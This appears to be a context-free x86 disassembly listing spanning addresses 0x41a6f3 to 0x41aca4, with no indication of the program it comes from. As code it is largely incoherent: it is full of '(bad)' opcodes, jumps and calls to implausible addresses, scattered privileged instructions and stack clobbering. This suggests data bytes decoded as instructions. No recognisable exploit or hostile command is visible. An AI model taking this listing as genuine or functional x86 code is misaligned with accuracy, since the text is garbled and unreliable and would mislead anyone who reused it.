  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
